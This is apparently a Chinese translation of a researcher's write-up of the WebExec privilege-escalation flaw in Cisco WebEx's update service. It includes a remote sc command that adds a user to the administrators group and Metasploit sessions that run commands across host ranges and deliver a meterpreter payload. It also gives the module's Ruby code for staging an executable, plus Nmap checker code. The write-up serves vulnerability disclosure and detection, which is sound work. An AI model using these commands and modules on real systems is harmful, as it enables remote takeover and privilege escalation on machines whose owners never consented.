    c:\>sc \\10.0.0.0 start webexservice a software-update 1 net localgroup administrators testuser /add
该命令将在另一台机器上运行（并且甚至会弹出一个GUI！）。
# 使用Metasploit进行远程开发
为了简化这种攻击，我写了一对Metasploit模块。一个是[辅助模块](https://github.com/iagox86/metasploit-framework-webexec/blob/master/lib/msf/core/exploit/smb/client/webexec.rb)，它实现此攻击以远程运行任意命令，另一个是[完整的漏洞利用模块](https://github.com/iagox86/metasploit-framework-webexec/blob/master/modules/exploits/windows/smb/webexec.rb)。两者都需要有效的SMB帐户（本地或域），并且两者都主要依赖于我编写的[WebExec库](https://github.com/CounterHack/webexec-metasploit/blob/cisco-webex-exploit/lib/msf/core/exploit/smb/client/webexec.rb)。
以下是使用辅助模块在一堆易受攻击的计算机上运行计算的示例：
    msf5 > use auxiliary/admin/smb/webexec_command
    msf5 auxiliary(admin/smb/webexec_command) > set RHOSTS 192.168.1.100-110
    RHOSTS => 192.168.56.100-110
    msf5 auxiliary(admin/smb/webexec_command) > set SMBUser testuser
    SMBUser => testuser
    msf5 auxiliary(admin/smb/webexec_command) > set SMBPass testuser
    SMBPass => testuser
    msf5 auxiliary(admin/smb/webexec_command) > set COMMAND calc
    COMMAND => calc
    msf5 auxiliary(admin/smb/webexec_command) > exploit
    [-] 192.168.56.105:445    - No service handle retrieved
    [+] 192.168.56.105:445    - Command completed!
    [-] 192.168.56.103:445    - No service handle retrieved
    [+] 192.168.56.103:445    - Command completed!
    [+] 192.168.56.104:445    - Command completed!
    [+] 192.168.56.101:445    - Command completed!
    [*] 192.168.56.100-110:445 - Scanned 11 of 11 hosts (100% complete)
    [*] Auxiliary module execution completed
这是完整的漏洞利用模块：
    msf5 > use exploit/windows/smb/webexec
    msf5 exploit(windows/smb/webexec) > set SMBUser testuser
    SMBUser => testuser
    msf5 exploit(windows/smb/webexec) > set SMBPass testuser
    SMBPass => testuser
    msf5 exploit(windows/smb/webexec) > set PAYLOAD windows/meterpreter/bind_tcp
    PAYLOAD => windows/meterpreter/bind_tcp
    msf5 exploit(windows/smb/webexec) > set RHOSTS 192.168.56.101
    RHOSTS => 192.168.56.101
    msf5 exploit(windows/smb/webexec) > exploit
    [*] 192.168.56.101:445 - Connecting to the server...
    [*] 192.168.56.101:445 - Authenticating to 192.168.56.101:445 as user 'testuser'...
    [*] 192.168.56.101:445 - Command Stager progress -   0.96% done (999/104435 bytes)
    [*] 192.168.56.101:445 - Command Stager progress -   1.91% done (1998/104435 bytes)
    ...
    [*] 192.168.56.101:445 - Command Stager progress -  98.52% done (102891/104435 bytes)
    [*] 192.168.56.101:445 - Command Stager progress -  99.47% done (103880/104435 bytes)
    [*] 192.168.56.101:445 - Command Stager progress - 100.00% done (104435/104435 bytes)
    [*] Started bind TCP handler against 192.168.56.101:4444
    [*] Sending stage (179779 bytes) to 192.168.56.101
如果您查看上面链接的代码，那么实际的实现基本上是直截了当的，但是我想特别地谈谈利用模块，因为它有一个有趣的问题:如何首先让一个meterpreter
.exe加载来执行它?
我首先使用了一个类似于psexec的漏洞，我们将.exe文件上传到一个可写的共享中，然后通过WebExec执行它。事实证明，这是有问题的，因为上传到共享通常需要管理员权限，这时您可以简单地使用psexec。你失去了WebExec的魔力!
经过与[Egyp7](https://twitter.com/egyp7)的一些讨论，我意识到我可以使用Msf :: Exploit ::
CmdStager
mixin将命令转发到.exe文件到文件系统。使用.vbs的staging风格，它会将一个Base64编码的文件写入磁盘，然后使用.vbs存根来解码并执行它！
但是有几个问题：
  * 最大行长度为1200个字符，而CmdStagermixin每一行使用2000个字符。
  * CmdStager使用%TEMP%作为一个临时目录，但是我们的攻击没有扩展路径。
  * WebExecService似乎用反斜杠转义引号，我不知道如何关闭它。
前两个问题可以通过添加选项来解决(一旦我找到了要使用的选项):
    wexec(true) do |opts|
      opts[:flavor] = :vbs
      opts[:linemax] = datastore["MAX_LINE_LENGTH"]
      opts[:temp] = datastore["TMPDIR"]
      opts[:delay] = 0.05
      execute_cmdstager(opts)
    end
execute_cmdstager()将一遍又一遍地执行execute_command()来构建磁盘上的有效负载，这是我们修复最后一个问题的地方:
    # This is the callback for cmdstager, which breaks the full command into
    # chunks and sends it our way. We have to do a bit of finangling to make it
    # work correctly
    def execute_command(command, opts)
      # Replace the empty string, "", with a workaround - the first 0 characters of "A"
      command = command.gsub('""', 'mid(Chr(65), 1, 0)')
      # Replace quoted strings with Chr(XX) versions, in a naive way
      command = command.gsub(/"[^"]*"/) do |capture|
        capture.gsub(/"/, "").chars.map do |c|
          "Chr(#{c.ord})"
        end.join('+')
      end
      # Prepend "cmd /c" so we can use a redirect
      command = "cmd /c " + command
      execute_single_command(command, opts)
    end
首先，它将空字符串替换为mid(Chr(65)， 1,0)，即字符串“A”中的字符1 - 1。或者空字符串!
其次,它取代其他字符串对应(n)+(n)从而向+ ....我们不能使用&，因为shell已经使用了&来链接命令。后来我得知,我们可以逃避它,用^
&,工作得很好,但+短所以我坚持。
最后，我们将cmd /c前置到命令中，这样我们就可以回显到一个文件中，而不只是将>符号传递给进程。我们可以使用^ >。
在有针对性的攻击中，显然可以更干净地做到这一点，但这似乎是一般来说这样做的好方法！
在有针对性的攻击中，显然可以更干净地完成这项任务，但这似乎是一种很好的通用方式!
# 检查补丁
这是很少出现(或者可能不是很少见)的情况之一，在这种情况下，利用漏洞实际上比检查更容易!
补丁版本的WebEx仍然允许远程用户连接到进程并启动它。然而，如果进程检测到它被要求运行一个未被WebEx签名的可执行文件，那么执行就会停止。不幸的是，这没有给我们任何关于主机是否脆弱的信息!
有很多针对目标的方法可以验证代码是否运行。我们可以使用DNS请求，telnet返回到特定的端口，在webroot中删除文件等等。
为了利用这一点，您必须能够获得service-controlservice
(svcctl)的句柄，因此为了编写检查程序，我决定安装一个假服务，尝试启动它，然后删除该服务。如果启动服务返回OK或ACCESS_DENIED，我们知道它工作正常!
下面是我们开发的[Nmap检查器模块](https://github.com/iagox86/nmap-webexec/blob/master/scripts/smb-vuln-webexec.nse)的重要代码:
    -- Create a test service that we can query
    local webexec_command = "sc create " .. test_service .. " binpath= c:\\fakepath.exe"
    status, result = msrpc.svcctl_startservicew(smbstate, open_service_result['handle'], stdnse.strsplit(" ", "install software-update 1 " .. webexec_command))
    -- ...
    local test_status, test_result = msrpc.svcctl_openservicew(smbstate, open_result['handle'], test_service, 0x00000)
    -- If the service DOES_NOT_EXIST, we couldn't run code
    if string.match(test_result, 'DOES_NOT_EXIST') then
      stdnse.debug("Result: Test service does not exist: probably not vulnerable")
      msrpc.svcctl_closeservicehandle(smbstate, open_result['handle'])
      vuln.check_results = "Could not execute code via WebExService"
      return report:make_output(vuln)
    end
未显示：我们也会在完成后删除该服务。
# 结论
就是这样!使用WebEx的内置更新服务从0提升到system权限!本地和远程!查看[webexec.org](https://webexec.org/)上的工具和用法说明!
本文翻译自：